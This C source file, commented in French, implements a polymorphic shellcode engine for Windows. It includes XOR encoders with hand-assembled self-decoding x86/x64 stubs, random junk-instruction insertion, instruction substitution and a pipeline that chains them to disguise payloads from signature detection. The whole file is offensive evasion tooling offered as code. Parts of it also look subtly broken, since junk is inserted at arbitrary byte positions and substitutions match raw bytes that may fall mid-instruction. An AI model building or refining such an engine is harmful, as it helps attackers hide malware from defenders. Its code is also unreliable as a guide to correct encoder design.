/*
 * polymorph.c - Génération de code polymorphique et métamorphique
 *
 * Le code polymorphique change d'apparence à chaque exécution
 * tout en gardant la même fonctionnalité.
 *
 * Techniques:
 * - Encodage XOR avec clé aléatoire + décodeur
 * - Substitution d'instructions équivalentes
 * - Insertion de junk code
 * - Réordonnancement des blocs
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

/* =========================================================================
 * Générateur de nombres aléatoires sécurisé
 * ========================================================================= */

static BOOL g_rng_initialized = FALSE;

/*
 * Initialise le RNG avec une seed basée sur le temps + performance counter
 */
static void InitRNG(void) {
    if (g_rng_initialized) return;
    
    LARGE_INTEGER pc;
    QueryPerformanceCounter(&pc);
    
    srand((unsigned int)(time(NULL) ^ pc.LowPart ^ GetTickCount()));
    g_rng_initialized = TRUE;
}

/*
 * Génère un byte aléatoire
 */
static BYTE RandomByte(void) {
    InitRNG();
    return (BYTE)(rand() % 256);
}

/*
 * Génère un DWORD aléatoire
 */
static DWORD RandomDword(void) {
    InitRNG();
    return ((DWORD)rand() << 16) | (DWORD)rand();
}

/*
 * Génère des bytes aléatoires
 */
static void RandomBytes(BYTE* buffer, DWORD size) {
    InitRNG();
    for (DWORD i = 0; i < size; i++) {
        buffer[i] = (BYTE)(rand() % 256);
    }
}

/* =========================================================================
 * Encodeurs polymorphiques
 * ========================================================================= */

/*
 * Encode un shellcode avec XOR et génère un décodeur
 * Le résultat est: [décodeur][shellcode_encodé]
 */
BOOL Poly_XOREncode(BYTE* shellcode, DWORD shellcodeSize, 
                    BYTE** outEncoded, DWORD* outSize) {
    if (!shellcode || !outEncoded || !outSize) return FALSE;
    
    /* Génère une clé XOR aléatoire */
    BYTE key = RandomByte();
    while (key == 0) key = RandomByte(); /* Évite clé nulle */
    
    /* Taille du décodeur stub (x64) */
    /* Le stub fait: 
     * - Trouve son adresse
     * - XOR chaque byte du shellcode
     * - Saute au shellcode décodé
     */
    
#ifdef _WIN64
    /* Décodeur x64 - environ 45 bytes */
    BYTE decoder[] = {
        /* call $+5 pour obtenir RIP */
        0xE8, 0x00, 0x00, 0x00, 0x00,           /* call $+5 */
        /* pop rax (rax = adresse après call) */
        0x58,                                     /* pop rax */
        /* add rax, <offset vers shellcode> */
        0x48, 0x83, 0xC0, 0x00,                  /* add rax, XX (patché) */
        /* mov rcx, <taille shellcode> */
        0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, /* mov rcx, XXXX (patché) */
        /* decode_loop: */
        /* xor byte ptr [rax + rcx - 1], <key> */
        0x80, 0x74, 0x08, 0xFF, 0x00,            /* xor byte [rax+rcx-1], XX (patché) */
        /* loop decode_loop */
        0xE2, 0xF9,                               /* loop -7 */
        /* jmp rax (shellcode décodé) */
        0xFF, 0xE0                                /* jmp rax */
    };
    
    DWORD decoderSize = sizeof(decoder);
    DWORD totalSize = decoderSize + shellcodeSize;
    
    /* Alloue le buffer de sortie */
    BYTE* encoded = (BYTE*)malloc(totalSize);
    if (!encoded) return FALSE;
    
    /* Copie le décodeur */
    memcpy(encoded, decoder, decoderSize);
    
    /* Patch les valeurs */
    encoded[9] = (BYTE)(decoderSize - 10);  /* Offset vers shellcode */
    *(DWORD*)(encoded + 13) = shellcodeSize; /* Taille */
    encoded[22] = key;                        /* Clé XOR */
    
    /* Copie et encode le shellcode */
    for (DWORD i = 0; i < shellcodeSize; i++) {
        encoded[decoderSize + i] = shellcode[i] ^ key;
    }
    
#else
    /* Décodeur x86 - environ 30 bytes */
    BYTE decoder[] = {
        /* call $+5 */
        0xE8, 0x00, 0x00, 0x00, 0x00,
        /* pop eax */
        0x58,
        /* add eax, <offset> */
        0x83, 0xC0, 0x00,
        /* mov ecx, <size> */
        0xB9, 0x00, 0x00, 0x00, 0x00,
        /* decode_loop: xor byte [eax+ecx-1], key */
        0x80, 0x74, 0x08, 0xFF, 0x00,
        /* loop */
        0xE2, 0xF9,
        /* jmp eax */
        0xFF, 0xE0
    };
    
    DWORD decoderSize = sizeof(decoder);
    DWORD totalSize = decoderSize + shellcodeSize;
    
    BYTE* encoded = (BYTE*)malloc(totalSize);
    if (!encoded) return FALSE;
    
    memcpy(encoded, decoder, decoderSize);
    
    encoded[8] = (BYTE)(decoderSize - 9);
    *(DWORD*)(encoded + 10) = shellcodeSize;
    encoded[18] = key;
    
    for (DWORD i = 0; i < shellcodeSize; i++) {
        encoded[decoderSize + i] = shellcode[i] ^ key;
    }
#endif
    
    *outEncoded = encoded;
    *outSize = totalSize;
    
    return TRUE;
}

/*
 * Encode avec XOR multi-byte (plus résistant)
 */
BOOL Poly_MultiXOREncode(BYTE* shellcode, DWORD shellcodeSize,
                         DWORD keySize, BYTE** outEncoded, DWORD* outSize) {
    if (!shellcode || !outEncoded || !outSize || keySize == 0) return FALSE;
    if (keySize > 16) keySize = 16; /* Max 16 bytes de clé */
    
    /* Génère une clé aléatoire */
    BYTE key[16];
    RandomBytes(key, keySize);
    
    /* Le décodeur est plus complexe pour multi-byte */
    /* Pour simplifier, on utilise une approche avec la clé intégrée */
    
#ifdef _WIN64
    /* Header: stocke keySize et la clé, puis le décodeur */
    DWORD headerSize = 1 + keySize; /* keySize byte + key bytes */
    
    /* Décodeur qui utilise la clé stockée */
    BYTE decoder[] = {
        /* call $+5 */
        0xE8, 0x00, 0x00, 0x00, 0x00,
        /* pop rax (base) */
        0x58,
        /* movzx r8, byte [rax - headerSize] (keySize) */
        0x4C, 0x0F, 0xB6, 0x40, 0x00, /* patché */
        /* lea r9, [rax - headerSize + 1] (key ptr) */
        0x4C, 0x8D, 0x48, 0x00, /* patché */
        /* add rax, decoderSize - 5 (shellcode ptr) */
        0x48, 0x83, 0xC0, 0x00, /* patché */
        /* mov rcx, shellcodeSize */
        0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00,
        /* xor rdx, rdx (key index) */
        0x48, 0x31, 0xD2,
        /* decode_loop: */
        /* mov r10b, [r9 + rdx] */
        0x45, 0x8A, 0x14, 0x11,
        /* xor [rax], r10b */
        0x44, 0x30, 0x10,
        /* inc rax */
        0x48, 0xFF, 0xC0,
        /* inc rdx */
        0x48, 0xFF, 0xC2,
        /* cmp rdx, r8 */
        0x49, 0x39, 0xD0,
        /* jb skip_reset */
        0x72, 0x03,
        /* xor rdx, rdx */
        0x48, 0x31, 0xD2,
        /* skip_reset: loop */
        0xE2, 0xE7,
        /* sub rax, shellcodeSize */
        0x48, 0x2D, 0x00, 0x00, 0x00, 0x00,
        /* jmp rax */
        0xFF, 0xE0
    };
    
    DWORD decoderSize = sizeof(decoder);
    DWORD totalSize = headerSize + decoderSize + shellcodeSize;
    
    BYTE* encoded = (BYTE*)malloc(totalSize);
    if (!encoded) return FALSE;
    
    /* Écrit le header (keySize + key) */
    encoded[0] = (BYTE)keySize;
    memcpy(encoded + 1, key, keySize);
    
    /* Copie le décodeur */
    memcpy(encoded + headerSize, decoder, decoderSize);
    
    /* Patch les offsets */
    BYTE* dec = encoded + headerSize;
    dec[10] = (BYTE)(-(int)headerSize);
    dec[14] = (BYTE)(-(int)headerSize + 1);
    dec[18] = (BYTE)(decoderSize - 5);
    *(DWORD*)(dec + 22) = shellcodeSize;
    *(DWORD*)(dec + 54) = shellcodeSize;
    
    /* Encode le shellcode */
    for (DWORD i = 0; i < shellcodeSize; i++) {
        encoded[headerSize + decoderSize + i] = shellcode[i] ^ key[i % keySize];
    }
    
    *outEncoded = encoded;
    *outSize = totalSize;
    
#else
    /* Version x86 simplifiée - utilise XOR simple */
    return Poly_XOREncode(shellcode, shellcodeSize, outEncoded, outSize);
#endif
    
    return TRUE;
}

/* =========================================================================
 * Insertion de Junk Code
 * ========================================================================= */

/*
 * Instructions junk valides qui ne font rien d'utile
 */
static const BYTE JUNK_INSTRUCTIONS[][4] = {
    {0x90, 0x00, 0x00, 0x00},             /* nop (1 byte) */
    {0x87, 0xC0, 0x00, 0x00},             /* xchg eax, eax (2 bytes) */
    {0x87, 0xDB, 0x00, 0x00},             /* xchg ebx, ebx */
    {0x87, 0xC9, 0x00, 0x00},             /* xchg ecx, ecx */
    {0x87, 0xD2, 0x00, 0x00},             /* xchg edx, edx */
    {0x50, 0x58, 0x00, 0x00},             /* push eax; pop eax */
    {0x53, 0x5B, 0x00, 0x00},             /* push ebx; pop ebx */
    {0x83, 0xC0, 0x00, 0x00},             /* add eax, 0 */
    {0x83, 0xE8, 0x00, 0x00},             /* sub eax, 0 */
    {0x0F, 0x1F, 0x00, 0x00},             /* nop dword ptr [eax] */
};

static const BYTE JUNK_SIZES[] = {1, 2, 2, 2, 2, 2, 2, 3, 3, 3};
#define NUM_JUNK_TYPES 10

/*
 * Génère du junk code aléatoire
 */
DWORD Poly_GenerateJunk(BYTE* buffer, DWORD maxSize) {
    if (!buffer || maxSize < 1) return 0;
    
    InitRNG();
    DWORD totalSize = 0;
    
    while (totalSize < maxSize) {
        int type = rand() % NUM_JUNK_TYPES;
        DWORD instrSize = JUNK_SIZES[type];
        
        if (totalSize + instrSize > maxSize) break;
        
        memcpy(buffer + totalSize, JUNK_INSTRUCTIONS[type], instrSize);
        totalSize += instrSize;
    }
    
    return totalSize;
}

/*
 * Insère du junk code dans un shellcode à intervalles aléatoires
 */
BOOL Poly_InsertJunk(BYTE* shellcode, DWORD shellcodeSize,
                     DWORD junkFrequency, BYTE** outResult, DWORD* outSize) {
    if (!shellcode || !outResult || !outSize) return FALSE;
    if (junkFrequency == 0) junkFrequency = 10;
    
    /* Estime la taille finale (pire cas: junk tous les N bytes) */
    DWORD estimatedSize = shellcodeSize + (shellcodeSize / junkFrequency) * 4 + 100;
    
    BYTE* result = (BYTE*)malloc(estimatedSize);
    if (!result) return FALSE;
    
    DWORD srcPos = 0;
    DWORD dstPos = 0;
    DWORD bytesSinceJunk = 0;
    
    InitRNG();
    
    while (srcPos < shellcodeSize) {
        /* Copie un byte du shellcode */
        result[dstPos++] = shellcode[srcPos++];
        bytesSinceJunk++;
        
        /* Insère du junk à intervalles aléatoires */
        if (bytesSinceJunk >= junkFrequency && (rand() % 3) == 0) {
            BYTE junk[8];
            DWORD junkSize = Poly_GenerateJunk(junk, 4);
            
            memcpy(result + dstPos, junk, junkSize);
            dstPos += junkSize;
            bytesSinceJunk = 0;
        }
    }
    
    *outResult = result;
    *outSize = dstPos;
    
    return TRUE;
}

/* =========================================================================
 * Substitution d'instructions
 * ========================================================================= */

/*
 * Substitutions équivalentes pour x86/x64
 */
typedef struct {
    BYTE original[8];
    DWORD originalSize;
    BYTE replacement[16];
    DWORD replacementSize;
} INSTRUCTION_SUBSTITUTION;

static const INSTRUCTION_SUBSTITUTION SUBSTITUTIONS[] = {
    /* mov eax, 0 -> xor eax, eax */
    {{0xB8, 0x00, 0x00, 0x00, 0x00}, 5, {0x31, 0xC0}, 2},
    /* mov ebx, 0 -> xor ebx, ebx */
    {{0xBB, 0x00, 0x00, 0x00, 0x00}, 5, {0x31, 0xDB}, 2},
    /* mov ecx, 0 -> xor ecx, ecx */
    {{0xB9, 0x00, 0x00, 0x00, 0x00}, 5, {0x31, 0xC9}, 2},
    /* mov edx, 0 -> xor edx, edx */
    {{0xBA, 0x00, 0x00, 0x00, 0x00}, 5, {0x31, 0xD2}, 2},
    /* nop -> xchg eax, eax */
    {{0x90}, 1, {0x87, 0xC0}, 2},
    /* push imm8; pop reg peut être remplacé par mov reg, imm8 */
};

#define NUM_SUBSTITUTIONS 5

/*
 * Applique des substitutions d'instructions
 */
BOOL Poly_SubstituteInstructions(BYTE* shellcode, DWORD shellcodeSize,
                                  BYTE** outResult, DWORD* outSize) {
    if (!shellcode || !outResult || !outSize) return FALSE;
    
    /* Alloue avec marge pour expansion */
    DWORD maxSize = shellcodeSize * 2;
    BYTE* result = (BYTE*)malloc(maxSize);
    if (!result) return FALSE;
    
    DWORD srcPos = 0;
    DWORD dstPos = 0;
    
    InitRNG();
    
    while (srcPos < shellcodeSize && dstPos < maxSize - 16) {
        BOOL substituted = FALSE;
        
        /* Cherche une substitution applicable */
        for (int i = 0; i < NUM_SUBSTITUTIONS; i++) {
            const INSTRUCTION_SUBSTITUTION* sub = &SUBSTITUTIONS[i];
            
            if (srcPos + sub->originalSize <= shellcodeSize &&
                memcmp(shellcode + srcPos, sub->original, sub->originalSize) == 0) {
                
                /* 50% de chance d'appliquer la substitution */
                if (rand() % 2 == 0) {
                    memcpy(result + dstPos, sub->replacement, sub->replacementSize);
                    srcPos += sub->originalSize;
                    dstPos += sub->replacementSize;
                    substituted = TRUE;
                    break;
                }
            }
        }
        
        if (!substituted) {
            result[dstPos++] = shellcode[srcPos++];
        }
    }
    
    /* Copie le reste */
    while (srcPos < shellcodeSize && dstPos < maxSize) {
        result[dstPos++] = shellcode[srcPos++];
    }
    
    *outResult = result;
    *outSize = dstPos;
    
    return TRUE;
}

/* =========================================================================
 * Génération polymorphique complète
 * ========================================================================= */

/*
 * Options de génération
 */
typedef struct {
    BOOL useXOREncoding;
    BOOL useMultiByteKey;
    DWORD keySize;
    BOOL insertJunk;
    DWORD junkFrequency;
    BOOL substituteInstructions;
} POLY_OPTIONS;

/*
 * Génère une version polymorphique du shellcode
 */
BOOL Poly_Generate(BYTE* shellcode, DWORD shellcodeSize,
                   POLY_OPTIONS* options, BYTE** outResult, DWORD* outSize) {
    if (!shellcode || !outResult || !outSize) return FALSE;
    
    BYTE* current = shellcode;
    DWORD currentSize = shellcodeSize;
    BYTE* temp = NULL;
    DWORD tempSize = 0;
    BOOL allocated = FALSE;
    
    /* Options par défaut si non spécifiées */
    POLY_OPTIONS defaultOpts = {
        .useXOREncoding = TRUE,
        .useMultiByteKey = FALSE,
        .keySize = 4,
        .insertJunk = FALSE,
        .junkFrequency = 10,
        .substituteInstructions = FALSE
    };
    
    if (!options) options = &defaultOpts;
    
    /* 1. Substitution d'instructions (si activé) */
    if (options->substituteInstructions) {
        if (Poly_SubstituteInstructions(current, currentSize, &temp, &tempSize)) {
            if (allocated) free((void*)current);
            current = temp;
            currentSize = tempSize;
            allocated = TRUE;
        }
    }
    
    /* 2. Insertion de junk (si activé) */
    if (options->insertJunk) {
        if (Poly_InsertJunk(current, currentSize, options->junkFrequency, &temp, &tempSize)) {
            if (allocated) free((void*)current);
            current = temp;
            currentSize = tempSize;
            allocated = TRUE;
        }
    }
    
    /* 3. Encodage XOR */
    if (options->useXOREncoding) {
        if (options->useMultiByteKey) {
            if (Poly_MultiXOREncode(current, currentSize, options->keySize, &temp, &tempSize)) {
                if (allocated) free((void*)current);
                current = temp;
                currentSize = tempSize;
                allocated = TRUE;
            }
        } else {
            if (Poly_XOREncode(current, currentSize, &temp, &tempSize)) {
                if (allocated) free((void*)current);
                current = temp;
                currentSize = tempSize;
                allocated = TRUE;
            }
        }
    }
    
    /* Si rien n'a été fait, copie le shellcode */
    if (!allocated) {
        current = (BYTE*)malloc(currentSize);
        if (!current) return FALSE;
        memcpy(current, shellcode, currentSize);
    }
    
    *outResult = current;
    *outSize = currentSize;
    
    return TRUE;
}

/* =========================================================================
 * Utilitaires
 * ========================================================================= */

/*
 * Libère la mémoire allouée par les fonctions Poly_*
 */
void Poly_Free(BYTE* buffer) {
    if (buffer) free(buffer);
}

/*
 * Retourne les options par défaut
 */
void Poly_GetDefaultOptions(POLY_OPTIONS* options) {
    if (!options) return;
    
    options->useXOREncoding = TRUE;
    options->useMultiByteKey = FALSE;
    options->keySize = 4;
    options->insertJunk = FALSE;
    options->junkFrequency = 10;
    options->substituteInstructions = FALSE;
}

/*
 * Dump les stats de génération
 */
BOOL Poly_GetStats(DWORD originalSize, DWORD encodedSize, char** outJson) {
    if (!outJson) return FALSE;
    
    char* json = (char*)malloc(512);
    if (!json) return FALSE;
    
    float ratio = (float)encodedSize / (float)originalSize;
    
    snprintf(json, 512,
        "{\n"
        "  \"original_size\": %lu,\n"
        "  \"encoded_size\": %lu,\n"
        "  \"overhead_bytes\": %ld,\n"
        "  \"expansion_ratio\": %.2f\n"
        "}",
        originalSize,
        encodedSize,
        (long)(encodedSize - originalSize),
        ratio
    );
    
    *outJson = json;
    return TRUE;
}
